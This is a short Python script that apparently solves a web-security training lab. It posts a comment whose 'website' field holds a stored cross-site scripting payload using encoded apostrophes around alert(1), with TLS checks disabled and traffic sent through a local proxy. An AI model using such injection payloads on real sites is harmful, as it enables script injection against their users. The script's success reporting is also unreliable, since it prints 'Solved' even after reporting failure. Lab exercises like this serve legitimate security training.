from bs4 import BeautifulSoup
import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http':'http://127.0.0.1:8080', 'https':'http://127.0.0.1:8080'}

def get_csrf_token(client, url):
    r = client.get(url)
    soup = BeautifulSoup(r.text, 'html.parser')
    return soup.find('input', attrs={'name': 'csrf'})['value']

def main():
    print('[+]Starting the exploit...')
    try:
        host = sys.argv[1].strip().rstrip('/')
    except IndexError:
        print(f'usage:{sys.argv[0]} <HOST')
        sys.exit(-1)
    
    client = requests.Session()
    client.verify = False
    client.proxies = proxies

    url = f'{host}/post/comment'

    data = {
        'csrf' : get_csrf_token(client, f'{host}/post?postId=1'),
        'postId' : '1',
        'comment': 'Hello Python script',
        'name': 'test',
        'email': 'test@gmail.com',
        'website':'http://test.com?&apos;-alert(1)-&apos;'
    }

    if client.post(url, data=data).status_code == 302:
        print(f'[-]Something went wrong')
    
    if 'Congratulations, you solved the lab!' not in client.get(host).text:
        print(f'[-] Failed to solved the lab.')

    print(f'[+] Solved')

if __name__ == "__main__":
    main()

